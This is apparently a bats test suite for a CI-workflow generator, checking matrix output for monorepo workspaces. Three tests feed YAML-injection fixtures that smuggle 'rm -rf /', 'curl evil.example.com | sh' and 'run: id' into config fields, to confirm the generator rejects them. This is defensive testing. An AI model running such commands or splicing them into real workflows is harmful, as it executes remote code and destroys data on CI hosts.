#!/usr/bin/env bats
# v1.9.0: gen-ci.sh emits a per-workspace matrix when workspace configs
# declare CI overrides, with YAML-safe key sanitization.

setup() {
  REPO_ROOT="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"
  GEN="${REPO_ROOT}/bin/gen-ci.sh"
  TMP="$(mktemp -d)"
  TARGET="$TMP/repo"
  mkdir -p "$TARGET"
  cat > "$TMP/profile.json" <<'EOF'
{
  "name": "test", "schemaVersion": 1,
  "stack": {"primary_language": "typescript"},
  "branching": {"strategy": "trunk-based", "base_branches": ["main"]},
  "hooks": {"pre_commit": ["eslint"], "commit_msg": ["conventional-commits"], "pre_push": []},
  "extras": {}, "conventions": {"commit_format": "conventional-commits"},
  "documentation": {"scaffold_types": [], "storage_strategy": "local", "claude_md_mode": "router"},
  "ci": {"enabled": true, "lint": true, "typecheck": true, "test": true}
}
EOF
}

teardown() { rm -rf "$TMP"; }

@test "single-stack repo: gen-ci emits a top-level workflow without workspace matrix" {
  echo '{"primary_language":"typescript","is_monorepo":false}' > "$TMP/stack.json"
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" --stack "$TMP/stack.json"
  [ "$status" -eq 0 ]
  [ -f "$TARGET/.github/workflows/ci.yml" ]
}

@test "monorepo with workspace configs: emits separate ci-workspaces.yml with per-workspace matrix" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"

  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":false,"test":true},
   "hooks":{"pre_commit":["ruff"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF

  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  [ -f "$TARGET/.github/workflows/ci-workspaces.yml" ]
  # Per-workspace matrix lives in ci-workspaces.yml, not ci.yml
  grep -q "packages/api" "$TARGET/.github/workflows/ci-workspaces.yml"
  grep -q "packages/web" "$TARGET/.github/workflows/ci-workspaces.yml"
}

@test "workspace with ci.enabled=false is omitted from matrix (regression)" {
  # Regression guard: the matrix builder previously ignored ci.enabled
  # and produced a job for every workspace. Now it skips disabled ones.
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip","profile":null,
   "ci":{"enabled":false,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  # If only one workspace is CI-enabled, the matrix-workflow file may not
  # render at all (since the multi-workspace branch needs >=2). Either way,
  # packages/api must NOT appear anywhere in the generated workflows.
  if [[ -f "$TARGET/.github/workflows/ci-workspaces.yml" ]]; then
    ! grep -q "packages/api" "$TARGET/.github/workflows/ci-workspaces.yml"
    grep -q "packages/web" "$TARGET/.github/workflows/ci-workspaces.yml"
  fi
}

@test "workspace flags lint=false: matrix entry has lint-run=false (Codex regression)" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip","profile":null,
   "ci":{"enabled":true,"lint":false,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  # packages/api block has lint-run: 'false'; packages/web has lint-run: 'true'
  awk '/- workspace: api/,/- workspace: web/' "$yml" | grep -Fq "lint-run: 'false'"
  awk '/- workspace: web/,/^$/' "$yml" | grep -Fq "lint-run: 'true'"
}

@test "workspace flags typecheck=true emits typecheck-cmd in matrix (Codex regression)" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  # Python workspace typecheck = mypy
  awk '/- workspace: api/,/- workspace: web/' "$yml" | grep -Fq "typecheck-cmd: 'mypy ."
  # TS workspace typecheck = pnpm exec tsc --noEmit
  awk '/- workspace: web/,/^$/' "$yml" | grep -Fq "typecheck-cmd: 'pnpm exec tsc --noEmit'"
  # Workflow steps reference matrix.typecheck-run
  grep -q "matrix.typecheck-run == 'true'" "$yml"
  grep -q "name: Type check" "$yml"
}

@test "workspace using pnpm: ci-workspaces.yml installs pnpm via pnpm/action-setup (Codex regression)" {
  # Single-stack TS template (templates/ci/typescript.yml) has the pnpm
  # setup step; the per-workspace matrix workflow regressed and dropped
  # it. A pnpm workspace would bootstrap with a green nyann run, then
  # immediately ship a CI workflow that fails on first run with
  # "pnpm: command not found". Re-add parity.
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"},{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  # pnpm/action-setup step is conditional on matrix.package-manager
  grep -Fq "uses: pnpm/action-setup@v4" "$yml"
  grep -Fq "matrix.package-manager == 'pnpm'" "$yml"
  # The pnpm workspace entry has package-manager: 'pnpm' in its include block
  awk '/- workspace: web/,/- workspace: api/' "$yml" | grep -Fq "package-manager: 'pnpm'"
  # The npm workspace gets package-manager: 'npm', which the conditional skips
  awk '/- workspace: api/,/^$/' "$yml" | grep -Fq "package-manager: 'npm'"
}

@test "workspace using bun: ci-workspaces.yml installs Bun via setup-bun" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/edge","primary_language":"typescript","framework":null,"package_manager":"bun"},{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/edge","primary_language":"typescript","framework":null,"package_manager":"bun","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  grep -Fq "uses: oven-sh/setup-bun@v2" "$yml"
  grep -Fq "matrix.package-manager == 'bun'" "$yml"
}

@test "hostile workspace primary_language is rejected (YAML injection guard)" {
  # Codex security finding: untrusted scalars (ws_lang, ws_pm, *-run booleans)
  # were interpolated into ci-workspaces.yml without quote/newline validation.
  # A hostile workspace-configs.json could splice attacker-controlled keys
  # into the matrix block and run arbitrary commands on CI.
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"},{"path":"packages/evil","primary_language":"typescript","framework":null,"package_manager":"npm"}]}' > "$TMP/stack.json"
  # Two workspaces: one clean, one with a newline-injection in primary_language.
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/evil","primary_language":"typescript\n      run: rm -rf /","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  # Workflow must NOT contain the injected payload
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  ! grep -F "rm -rf" "$yml"
  # Clean workspace IS in the matrix
  grep -Fq -- "- workspace: api" "$yml"
  # Hostile workspace was rejected with a warn
  echo "$output" | grep -q "skipping workspace evil"
  echo "$output" | grep -q "primary_language has unsafe characters"
}

@test "hostile workspace package_manager is rejected (YAML injection guard)" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"},{"path":"packages/evil","primary_language":"typescript","framework":null,"package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/evil","primary_language":"typescript","framework":null,"package_manager":"pnpm'\n      run: curl evil.example.com | sh\n      x: 'x","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  ! grep -F "curl evil.example.com" "$yml"
  ! grep -F "rm -rf" "$yml"
  echo "$output" | grep -q "package_manager has unsafe characters"
}

@test "non-boolean ci.* flag is rejected (YAML injection guard)" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"},{"path":"packages/evil","primary_language":"typescript","framework":null,"package_manager":"npm"}]}' > "$TMP/stack.json"
  # Note: ci.lint is a STRING with newlines, not a boolean. jq would echo it verbatim.
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/evil","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":"true'\n      run: id","typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  # No id-leak command spliced into the workflow
  ! grep -F "run: id" "$yml"
  echo "$output" | grep -q "non-boolean value"
}

@test "hostile workspace ci.node_version is rejected (numeric-version guard, BUG C)" {
  # ws_ci comes from a (possibly remote) profile; a malformed-but-quote-free
  # node_version must not reach the matrix `version:` field — it reverts to
  # the language default. (Quote/newline payloads are caught by the YAML-safe
  # filter; this guards the strict numeric grammar mirroring _schema.json.)
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true,"node_version":"20"},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true,"node_version":"20-evil"},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  python3 -c "import yaml; yaml.safe_load(open('$yml'))"
  # The bad version was reverted to the default; the tainted token never lands.
  ! grep -Fq "20-evil" "$yml"
  awk '/- workspace: web/,/^$/' "$yml" | grep -Fq "version: '20'"
}

@test "workspace key with special characters: sanitized in YAML" {
  echo '{"primary_language":"typescript","is_monorepo":true,"workspaces":[{"path":"apps/my-cool-app","primary_language":"typescript","framework":null,"package_manager":"npm"}]}' > "$TMP/stack.json"

  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"apps/my-cool-app","primary_language":"typescript","framework":null,"package_manager":"npm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF

  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  # Generated YAML must parse via python yaml (or fail this test)
  python3 -c "import yaml; yaml.safe_load(open('$TARGET/.github/workflows/ci.yml'))"
}

@test "two non-JS workspaces (go + python): matrix is non-empty, valid YAML, correct install-cmds (BUG A/B)" {
  # Regression: the no-package-manager install sentinel used to contain
  # single quotes ("echo 'no install'"), which the YAML safety filter
  # rejected — dropping the whole workspace. Two non-JS workspaces could
  # leave matrix.include empty, which GitHub rejects outright. And
  # unknown/non-JS package managers used to default to `npm ci`, failing
  # at install on every non-JS workspace.
  echo '{"primary_language":"go","is_monorepo":true,"package_manager":"go","workspaces":[{"path":"services/api","primary_language":"go","framework":null,"package_manager":"go"},{"path":"services/worker","primary_language":"python","framework":null,"package_manager":"poetry"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"services/api","primary_language":"go","framework":null,"package_manager":"go","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"services/worker","primary_language":"python","framework":null,"package_manager":"poetry","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  # Generated workflow parses as YAML.
  python3 -c "import yaml; yaml.safe_load(open('$yml'))"
  # Both non-JS workspaces survive into the matrix (non-empty include).
  python3 -c "import yaml,sys; d=yaml.safe_load(open('$yml')); inc=d['jobs']['workspace-ci']['strategy']['matrix']['include']; sys.exit(0 if len(inc)==2 else 1)"
  # Correct, non-npm install commands.
  awk '/- workspace: api/,/- workspace: worker/' "$yml" | grep -Fq "install-cmd: 'go mod download'"
  awk '/- workspace: worker/,/^$/' "$yml" | grep -Fq "install-cmd: 'poetry install'"
  # Neither non-JS workspace degraded to npm ci.
  ! awk '/- workspace: api/,/test-cmd/' "$yml" | grep -Fq "install-cmd: 'npm ci'"
  ! awk '/- workspace: worker/,/test-cmd/' "$yml" | grep -Fq "install-cmd: 'npm ci'"
}

@test "workspace with unknown package manager falls back per-language, not npm ci (BUG B)" {
  # An unrecognized pm string for a Go workspace must resolve to the Go
  # install command, never the npm catch-all.
  echo '{"primary_language":"go","is_monorepo":true,"workspaces":[{"path":"services/api","primary_language":"go","framework":null,"package_manager":"go"},{"path":"services/cli","primary_language":"go","framework":null,"package_manager":"bazel"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"services/api","primary_language":"go","framework":null,"package_manager":"go","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"services/cli","primary_language":"go","framework":null,"package_manager":"bazel","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":[],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json"
  [ "$status" -eq 0 ]
  yml="$TARGET/.github/workflows/ci-workspaces.yml"
  [ -f "$yml" ]
  python3 -c "import yaml; yaml.safe_load(open('$yml'))"
  # Unknown 'bazel' pm on a Go workspace → go mod download, not npm ci.
  awk '/- workspace: cli/,/^$/' "$yml" | grep -Fq "install-cmd: 'go mod download'"
  ! grep -Fq "install-cmd: 'npm ci'" "$yml"
}

@test "--dry-run previews the workspace matrix and writes nothing (BUG G)" {
  # The dry-run exit used to sit before the workspace-matrix section, so
  # ci-workspaces.yml never appeared in the preview (preview-before-mutate
  # violation). It must now be previewed, and no file may be written.
  echo '{"primary_language":"typescript","is_monorepo":true,"package_manager":"pnpm","workspaces":[{"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip"},{"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm"}]}' > "$TMP/stack.json"
  cat > "$TMP/ws-configs.json" <<'EOF'
[
  {"path":"packages/api","primary_language":"python","framework":null,"package_manager":"pip","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["ruff"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null},
  {"path":"packages/web","primary_language":"typescript","framework":"next","package_manager":"pnpm","profile":null,
   "ci":{"enabled":true,"lint":true,"typecheck":true,"test":true},
   "hooks":{"pre_commit":["eslint"],"commit_msg":[],"pre_push":[]},
   "extras":{},"documentation":null}
]
EOF
  run bash "$GEN" --target "$TARGET" --profile "$TMP/profile.json" \
    --stack "$TMP/stack.json" --workspace-configs "$TMP/ws-configs.json" --dry-run
  [ "$status" -eq 0 ]
  # Workspace matrix preview appears on stdout.
  echo "$output" | grep -Fq "# nyann:ci-workspaces:start"
  echo "$output" | grep -Fq "name: CI (workspaces)"
  echo "$output" | grep -Fq "packages/api"
  echo "$output" | grep -Fq "packages/web"
  # Nothing was written.
  [ ! -f "$TARGET/.github/workflows/ci.yml" ]
  [ ! -f "$TARGET/.github/workflows/ci-workspaces.yml" ]
}
